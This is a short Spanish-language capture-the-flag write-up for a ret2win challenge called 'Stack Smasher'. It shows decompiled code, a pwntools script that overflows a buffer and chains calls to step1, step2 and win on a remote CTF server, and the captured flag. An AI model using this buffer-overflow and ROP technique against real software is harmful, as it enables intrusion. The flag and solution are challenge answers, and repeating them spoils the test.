# Stack Smasher

Es un simple ret2win. Por medio de un buffer overflow debemos llamar a `win` para que nos devuelva la flag, pero esta funcion requiere que dos variables esten inicializadas con un valor distinto de cero:
void sym.win(void)
```
{
    ulong uVar1;
    ulong uStack_20;
    uchar auStack_18 [8];
    ulong uStack_10;

    *(*0x20 + -0x20) = 0x40117d;
    uStack_10 = sym.imp.getenv("FLAG_VAL");
    if (((_obj.first & _obj.first) != 0) && ((_obj.second & _obj.second) != 0)) {
        uVar1 = uStack_10;
        *(*0x20 + -0x18 + -8) = 0x4011a1;
        sym.imp.puts(uVar1);
    }
    return;
}
```

Las funciones `step1` y `step2` hacen esto.

Debemos hacer ROP para llamar a `step1`, `step2` y despues a `win`:

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./StackSmasher")
#libc = ELF("./")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
break main
'''

domain= "ctf.mf.grsu.by"
port = 9078

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])
r = start()

#========= exploit here ===================
payload = b"A" * 40 + p64(elf.sym['step1']) + p64(elf.sym['step2']) + p64(elf.sym['win'])
r.sendlineafter(b":",payload)

r.interactive()
```

`grodno{unCL3_M47V3y_w45_h3R3_w17H_0ld_5Ch00L_3xPL017}`
